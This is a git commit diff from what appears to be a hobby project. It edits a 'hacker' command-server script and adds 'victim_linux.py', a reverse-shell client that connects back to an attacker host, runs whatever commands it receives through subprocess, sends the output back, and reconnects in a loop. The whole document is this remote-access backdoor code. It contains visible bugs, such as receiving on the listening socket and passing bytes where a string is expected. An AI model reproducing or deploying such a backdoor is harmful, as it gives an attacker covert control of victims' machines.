d7dca0158126068f6cbe29d6a249a18939b0850c
lehasaS <lehasaseoe77@gmail.com>
2023-03-08 15:20:11 +0200

    Branched victim scripts, edited hacker script

--- hacker_server.py
+++ hacker_server.py
@@ -1,4 +1,5 @@
 import socket
+IDENTIFIER = "<END_OF_COMMAND_RESULT>"
 
 def create_socket():
     hacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -13,22 +14,42 @@ def create_socket():
 def start_connection(hacker_socket:socket.socket):
     print("[+] Listening for victim connections.")
     hacker_listener_socket, client_address = hacker_socket.accept()
+    print("[+] Connection established with ", client_address)
     return hacker_listener_socket
 
 def transmit_commands(hacker_socket:socket.socket):
     connection_socket = start_connection(hacker_socket)
     try:
         while True:
-            command = input("[+] Enter Command:")
+            command = input("[+] Enter Command:\n")
             connection_socket.send(command.encode("utf-8"))
-            command_result = connection_socket.recv(1048)
-            print(command_result.decode("utf-8"))
+
+            if command == "kill":
+                connection_socket.close()
+                break
+            elif command == "":
+                continue
+            elif command.startswith("cd"):
+                hacker_socket.send(command.encode())
+                continue
+            else:
+                command_result = b''
+                while True:
+
+                    chunk = hacker_socket.recv(1048)
+                    if chunk.endswith(IDENTIFIER.encode()):
+                        chunk = chunk[:-len(IDENTIFIER)]
+                        command_result += chunk
+                        break
+
+                    command_result +=chunk
+                print(command_result.decode("utf-8"))
     except KeyboardInterrupt:
         print("\n[-] Ctrl+C detected.")
         connection_socket.close()
-        print("[+] Connection to victim closed.")
+        print("\n[+] Connection to victim closed.")
     except socket.error as e:
-        print("Socket error number: ", e.errno)
+        print("\n[-] Socket error number: ", e.errno)
         connection_socket.close()
     except:
         connection_socket.close()
---
+++ victim_linux.py
@@ -0,0 +1,63 @@
+import socket
+import subprocess
+import os
+import time
+IDENTIFIER = "\n<END_OF_COMMAND_RESULT>"
+
+def create_socket():
+    hacker_IP, hacker_port = "", 0
+    victim_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+
+    hacker_address = (hacker_IP, hacker_port)
+    victim_socket.connect(hacker_address)
+
+    return victim_socket
+
+def run_commands():
+
+    while True:
+        victim_socket = create_socket()
+        try:
+            while True:
+                data = victim_socket.recv(1024)
+                hacker_command = data.decode("utf-8")
+
+                if hacker_command == "kill":
+                    victim_socket.close()
+                    break
+                elif hacker_command == "":
+                    continue
+                elif hacker_command.startswith("cd"):
+                    path_to_move = hacker_command.strip("cd ")
+                    if os.path.exists(path_to_move):
+                        os.chdir(path_to_move)
+                    else:
+                        print("\n[-] Cant change dir to ", path_to_move)
+                    continue
+                else:
+                    output = subprocess.check_output(hacker_command.split(" "), stderr=subprocess.STDOUT)
+
+                    command_result = bytes(output, "utf-8")
+                    command_result = command_result.decode("utf-8") + IDENTIFIER
+                    command_result = command_result.encode("utf-8")
+                victim_socket.sendall(command_result)
+        except KeyboardInterrupt:
+            print("\n[-] Ctrl+C detected.")
+            victim_socket.close()
+        except Exception as err:
+            print("\n[-] Unable to connect: ", err)
+            print(err)
+            time.sleep(5)
+    
+    
+
+
+def listen_for_data():
+    victim_socket = create_socket()
+    victim_socket.recv(1024)
+
+def main():
+    run_commands()
+
+if __name__ == "__main__":
+    main()
